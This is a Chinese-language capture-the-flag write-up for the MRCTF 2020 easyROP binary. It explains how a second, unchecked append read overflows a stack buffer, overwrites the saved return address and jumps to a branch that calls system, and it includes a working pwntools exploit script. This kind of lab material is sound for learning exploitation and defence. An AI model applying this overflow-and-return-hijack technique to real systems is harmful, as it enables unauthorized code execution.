# MRCTF 2020 easyROP：先铺满缓冲区，再用追加读覆盖返回地址

> 仓库附件是 64 位非 PIE ELF。反汇编显示 `main` 在栈上建立约 `0x300` 字节的输入区，并按选项调用多个读取函数。周记记录的利用选择 `hehe` 读入 `0x300` 字节，再选 `byby` 从现有字符串末尾继续读，最后覆盖返回地址跳到 `sys` 的成功分支。地址与偏移均针对当前 ELF；本页尚无本轮 GDB 复现记录。

## 为什么分两次输入

`hehe` 将最多 `0x300` 字节读进 `main` 的局部缓冲区。该区域本身足以容纳这一轮输入；利用者再让缓冲区内容保持接近 `0x300` 字节，使下一步 `byby` 把数据追加到缓冲区末端。第二次读取没有验证剩余容量，因此可以继续写过 `main` 的保存帧。

```text
选项 2 → hehe：铺垫长字符串，控制 strlen 的追加位置
选项 7 → byby：read(0, buf + strlen(buf), 0x100)
                         ↓
                 覆盖 saved RIP
                         ↓
                  跳到 sys 分支
```

在当前 ELF 中，`sys` 的条件分支目标 `0x40072a` 会走 `system` 调用；函数后续会 `exit`。是否能直接获得 shell 还要看本地运行环境及命令字符串，不能只凭跳转地址判定。

## 载荷结构

仓库里的本地脚本展示了分阶段收发：第一轮发送 `0x2ff` 个 `A` 再接一个 NUL；第二轮从菜单中选择追加读，然后发送 `0x19` 字节填充和目标地址。首轮末尾的 NUL 使 `strlen` 停在可预测位置；第二轮的 `0x19` 来自“缓冲区起点到 saved RIP 的距离”减去首轮字符串长度。周记另记下远端节奏太快时要在菜单阶段适当等待，或按真实提示用 `sendafter` 同步；不要固定盲加 `sleep(1)`，先确认服务端提示和收包边界。

```python
from pwn import *

context.binary = elf = ELF('./mrctf2020_easyrop', checksec=False)
io = process(elf.path)

io.sendlineafter(b'choice', b'2')
io.sendafter(b'hehehehehehehe\n', b'A' * 0x2ff + b'\x00')
io.sendlineafter(b'choice', b'7')
io.sendafter(b'bybybybybybyby\n', b'B' * 0x19 + p64(0x40072a))
io.interactive()
```

提示字符串应以附件实际输出为准。周记里有不同收发写法；原始脚本中的远端地址已是占位值，不能照抄连接。动态验证前，用 GDB 查看首轮 `strlen`、第二次 `read` 的目标地址，以及返回前 `$rsp`/saved RIP，确认 `0x19` 偏移与当前附件一致。
